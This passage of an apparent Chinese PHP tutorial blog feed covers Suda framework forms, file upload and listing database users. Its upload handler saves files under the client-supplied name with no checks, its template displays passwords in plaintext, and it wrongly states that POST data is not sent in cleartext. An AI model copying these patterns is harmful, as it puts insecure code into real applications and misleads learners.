class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>添加用户<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"@u"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span>&gt;</span>添加用户<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>用户列表<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 与PHP If 一致 --&gt;</span></span><br><span class="line">        @if (is_array($:user))</span><br><span class="line">            @foreach ( $:user as $user)</span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123; $user['id'] &#125;&#125; - &#123;&#123;$user['name']&#125;&#125; - &#123;&#123;$user['password']&#125;&#125; <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            @endforeach</span><br><span class="line">        @else</span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span>空用户<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        @endif</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行界面：</p><p><img src="2.png" alt=""></p><p>我们测试插入一条数据</p><p><img src="3.png" alt=""></p><p>可以看到数据插入成功了</p><h2 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h2><ul><li>实现以上的功能</li><li>尝试 update 方法和 delete 方法</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li>数据表：<a href="https://github.com/DXkite/suda/blob/master/docs/classes/suda/archive/Table.md" target="_blank" rel="noopener">https://github.com/DXkite/suda/blob/master/docs/classes/suda/archive/Table.md</a></li></ul>]]></content>
      
      <categories>
          
          <category> 基础教程 </category>
          
          <category> Suda框架技能使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Suda </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Suda - 05 文件上传</title>
      <link href="/2018/08/03/suda-file-upload/"/>
      <url>/2018/08/03/suda-file-upload/</url>
      <content type="html"><![CDATA[<p>在一个网站中，除了能提交数据以外，还能够上传下载图片，本次讲讲解PHP的文件上传以及处理文件。</p><a id="more"></a><h2 id="文件上传表单"><a href="#文件上传表单" class="headerlink" title="文件上传表单"></a>文件上传表单</h2><p>前一课我们讲了通过GET,POST表单传值，现在我们创建一个文件表单，用来上传文件。</p><p>准备工作：</p><ul><li>创建一个路由 upload_file 匹配地址 /upload-file、 相应类：<code>cn\atd3\response\UploadResponse</code></li><li>创建一个页面模板  upload , 并使相应类显示这个模板</li></ul><p>准备工作完成后，应该能得到这个效果</p><p><img src="1.png" alt=""></p><h2 id="文件上传表单-1"><a href="#文件上传表单-1" class="headerlink" title="文件上传表单"></a>文件上传表单</h2><p>文件上传的表单和普通的表单不一样，文件上传的表单需要指定内容编码方式（encoding type)  为 <code>form-data</code><br>也是就是 <code>enctype=&quot;multipart/form-data&quot;</code> 如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 必须指定编码方式为 `multipart/form-data` --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"@u"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 指定文件类型 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"my_file_name"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 上传的同时可以上传数据 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"my_text"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span>上传文件<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在以上代码中，我们指定了一个文件和一个普通字符串作为表单数据。界面现在看起来像是这样：</p><p><img src="2.png" alt=""></p><h2 id="后端处理"><a href="#后端处理" class="headerlink" title="后端处理"></a>后端处理</h2><p>按照一般的套路，我们写一个处理代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$view = <span class="keyword">$this</span>-&gt;page(<span class="string">'upload'</span>); </span><br><span class="line"><span class="keyword">if</span> ($request-&gt;hasPost()) &#123;</span><br><span class="line">    $file = $request-&gt;files(<span class="string">'my_file_name'</span>);</span><br><span class="line">    $text = $request-&gt;post(<span class="string">'my_text'</span>);</span><br><span class="line">    $view-&gt;set(<span class="string">'file'</span>,$file);</span><br><span class="line">    $view-&gt;set(<span class="string">'text'</span>,$text);</span><br><span class="line">&#125;</span><br><span class="line">$view-&gt;render();</span><br></pre></td></tr></table></figure><p>前端HTML代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>文件上传测试<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 必须指定编码方式为 `multipart/form-data` --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"@u"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 指定文件类型 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"my_file_name"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 上传的同时可以上传数据 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"my_text"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span>上传文件<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>上传的内容<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;$:file&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;$:text&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="3.png" alt=""></p><p>你会发现出现了报错。报错位置在模板的30行。</p><p><img src="4.png" alt=""></p><p>报错原因是把数组转换成字符串错误，那么我们在模板中怎么输出数组？</p><h3 id="输出数组"><a href="#输出数组" class="headerlink" title="输出数组"></a>输出数组</h3><p>在模板中，使用 <code>@foreach</code> 和 <code>@endforeacn</code> 标记来代替PHP中的 <code>foreach</code> 和 <code>endforeach</code>，语法一致</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>上传的内容<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h4</span>&gt;</span>文件内容<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">    @foreach ($:file as $key =&gt; $value)</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123; $key&#125;&#125; =&gt; &#123;&#123;$value&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    @endforeach</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;$:text&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="字段解释"><a href="#字段解释" class="headerlink" title="字段解释"></a>字段解释</h3><p>在这里输出之后的样式为</p><p><img src="5.png" alt=""></p><p>其中字段的解释为：</p><table><thead><tr><th>字段</th><th>说明</th></tr></thead><tbody><tr><td>name</td><td>文件名</td></tr><tr><td>type</td><td>文件的MIME（Multipurpose Internet Mail Extensions）类型标识符</td></tr><tr><td>tmp_name</td><td>文件上传到服务器的临时位置</td></tr><tr><td>error</td><td>错误码， 0 表示没有错误，其他错误码 <a href="http://www.php.net/manual/zh/features.file-upload.errors.php" target="_blank" rel="noopener">参考官网</a></td></tr><tr><td>size</td><td>文件大小（字节）</td></tr></tbody></table><h2 id="处理上传文件"><a href="#处理上传文件" class="headerlink" title="处理上传文件"></a>处理上传文件</h2><p>处理文件我们用到的函数有两个，一个是 <code>is_uploaded_file</code> 用来判断是否是上传文件，一个是 <code>move_uploaded_file</code> ，用来移动临时文件到指定目录，这里：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($file[<span class="string">'error'</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 判断是否为上传文件</span></span><br><span class="line">    <span class="keyword">if</span> (is_uploaded_file($file[<span class="string">'tmp_name'</span>])) &#123;</span><br><span class="line">        <span class="comment">// 从临时文件移动到 DATA_DIR 目录下</span></span><br><span class="line">        move_uploaded_file($file[<span class="string">'tmp_name'</span>],DATA_DIR.<span class="string">'/'</span>.$file[<span class="string">'name'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $view-&gt;set(<span class="string">'text'</span>,__(<span class="string">'上传文件错误'</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我指定移动到 <code>DATA_DIR</code> 下面，并使用文件原来的名字作为上传后的文件名，可以看到文件的位置在 <code>app/data</code> 下面了。</p><p><img src="/images/placeholder.png" alt="" data-src="6.png" class="lazyload"></p><h2 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h2><p>自己写好文件上传处理</p>]]></content>
      
      <categories>
          
          <category> 基础教程 </category>
          
          <category> Suda框架技能使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Suda </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Suda - 04 表单与页面跳转</title>
      <link href="/2018/08/01/suda-form-action/"/>
      <url>/2018/08/01/suda-form-action/</url>
      <content type="html"><![CDATA[<p>上次课程我们讲了如何使用页面模板，这次课我们讲解一下如何在页面之间传值以及跳转。</p><a id="more"></a><h2 id="页面的URL"><a href="#页面的URL" class="headerlink" title="页面的URL"></a>页面的URL</h2><p>在框架之中，所有的URL都是由 <code>router.json</code> 文件来维护生成的，也就是说，所有的URL都是动态的，换而言之，我们不能直接写URL，而是要通过函数来实现生成URL，在PHP代码中，我们通过 <code>u</code> 函数来实现获取URL，在页面中，我们通过 <code>@u</code> 标记来获取URL，一个URL如何获取？通过他们的唯一名字来获取，函数调用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$self = u(); <span class="comment">// 不加参数表示获取当前的页面URL </span></span><br><span class="line">$url = u(<span class="string">'hello'</span>); <span class="comment">// 获取路由配置中 hello 的URL</span></span><br></pre></td></tr></table></figure><p>当前的页面路由：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"index"</span>: &#123;</span><br><span class="line">        <span class="attr">"class"</span>: <span class="string">"cn\\atd3\\response\\IndexResponse"</span>,</span><br><span class="line">        <span class="attr">"url"</span>: <span class="string">"\/"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"hello"</span>: &#123;</span><br><span class="line">        <span class="attr">"url"</span>: <span class="string">"\/hello"</span>,</span><br><span class="line">        <span class="attr">"template"</span>: <span class="string">"hello"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"action_page"</span>: &#123;</span><br><span class="line">        <span class="attr">"url"</span>: <span class="string">"\/action-page"</span>,</span><br><span class="line">        <span class="attr">"class"</span>: <span class="string">"cn\\atd3\\response\\ActionPageResponse"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试结果：</p><p><img src="1.png" alt=""></p><p>我们在模板文件中也可以使用，等价代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>@u<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>@u('hello')<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Form-表单"><a href="#Form-表单" class="headerlink" title="Form 表单"></a>Form 表单</h2><p>创建一个页面，用来显示 form 页面，其中路由名为 <code>form-action</code> , URL 为 <code>/my-form-action</code> , 调用的类：<code>cn\atd3\response\FormActionResponse</code>，使用的模板名称随意，建议 <code>form-action.tpl.html</code></p><p><strong>以上为上节课的练习，不会的多看看上节课</strong></p><p>在模板中添加一个GET表单：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Action PAGE<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">    | Form 表单 </span></span><br><span class="line"><span class="comment">    | action 表示提交数据到哪个页面</span></span><br><span class="line"><span class="comment">    | method 表示提交方式（GET，POST 两种） </span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"@u"</span> <span class="attr">method</span>=<span class="string">"GET"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"text_value"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"number"</span> <span class="attr">name</span>=<span class="string">"int_value"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span>&gt;</span>提交数据<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>提交的数据<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span> &#123;&#123; $:text &#125;&#125; <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span> &#123;&#123; $:int &#125;&#125; <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如上页面显示后，效果如下：</p><blockquote><p><strong>注意：</strong> HTML知识自己要去学</p></blockquote><h3 id="GET-方法提交数据"><a href="#GET-方法提交数据" class="headerlink" title="GET 方法提交数据"></a>GET 方法提交数据</h3><p><img src="2.png" alt=""></p><p>随便填写数据，点击提交后的效果如下：</p><p><img src="3.png" alt=""></p><p>可以看到页面URL上面的值就是我们刚刚提交的数据.那么,如何在PHP中获取到这些数据?我之前提到过我们的 Request 类. 在这个类中,可以获取到GET参数.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">cn</span>\<span class="title">atd3</span>\<span class="title">response</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">suda</span>\<span class="title">core</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FormActionResponse</span> <span class="keyword">extends</span> \<span class="title">suda</span>\<span class="title">core</span>\<span class="title">Response</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">onRequest</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $view = <span class="keyword">$this</span>-&gt;page(<span class="string">'form-action'</span>); </span><br><span class="line">        <span class="comment">// 如果存在 Get 数据</span></span><br><span class="line">        <span class="keyword">if</span> ($request-&gt;hasGet()) &#123;</span><br><span class="line">            <span class="comment">// 获取 GET 的 text_value 的值并设置到页面的text变量中</span></span><br><span class="line">            $view-&gt;set(<span class="string">'text'</span>,$request-&gt;get(<span class="string">'text_value'</span>));</span><br><span class="line">            <span class="comment">// 获取 GET 的 int_value 的值并设置到页面的int变量中</span></span><br><span class="line">            $view-&gt;set(<span class="string">'int'</span>,$request-&gt;get(<span class="string">'int_value'</span>)); </span><br><span class="line">        &#125;</span><br><span class="line">        $view-&gt;render();  <span class="comment">// 渲染模板显示出来</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><p><img src="4.png" alt=""></p><p>可以看到页面获取到了值并加入进去</p><h3 id="POST-方法提交数据"><a href="#POST-方法提交数据" class="headerlink" title="POST 方法提交数据"></a>POST 方法提交数据</h3><p>其实把 method 改成 POST 就可以了, POST与GET的区别大致如下:</p><ol><li>POST 可以提交的数据比 GET多</li><li>POST 可以提交文件</li><li>POST 安全性比GET好一点 数据不是明文传输</li></ol><p>POST数据的处理:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">cn</span>\<span class="title">atd3</span>\<span class="title">response</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">suda</span>\<span class="title">core</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FormActionResponse</span> <span class="keyword">extends</span> \<span class="title">suda</span>\<span class="title">core</span>\<span class="title">Response</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">onRequest</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $view = <span class="keyword">$this</span>-&gt;page(<span class="string">'form-action'</span>); </span><br><span class="line">        <span class="comment">// 如果存在 Get 数据</span></span><br><span class="line">        <span class="keyword">if</span> ($request-&gt;hasGet()) &#123;</span><br><span class="line">            $view-&gt;set(<span class="string">'method'</span>,<span class="string">'GET'</span>);</span><br><span class="line">            <span class="comment">// 获取 GET 的 text_value 的值并设置到页面的text变量中</span></span><br><span class="line">            $view-&gt;set(<span class="string">'text'</span>,$request-&gt;get(<span class="string">'text_value'</span>));</span><br><span class="line">            <span class="comment">// 获取 GET 的 int_value 的值并设置到页面的int变量中</span></span><br><span class="line">            $view-&gt;set(<span class="string">'int'</span>,$request-&gt;get(<span class="string">'int_value'</span>)); </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ($request-&gt;hasPost()) &#123;</span><br><span class="line">            $view-&gt;set(<span class="string">'method'</span>,<span class="string">'POST'</span>);</span><br><span class="line">            <span class="comment">// 获取 POST 的 text_value 的值并设置到页面的text变量中</span></span><br><span class="line">            $view-&gt;set(<span class="string">'text'</span>,$request-&gt;post(<span class="string">'text_value'</span>));</span><br><span class="line">            <span class="comment">// 获取 POST 的 int_value 的值并设置到页面的int变量中</span></span><br><span class="line">            $view-&gt;set(<span class="string">'int'</span>,$request-&gt;post(<span class="string">'int_value'</span>)); </span><br><span class="line">        &#125;</span><br><span class="line">        $view-&gt;render();  <span class="comment">// 渲染模板显示出来</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>网页HTML</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 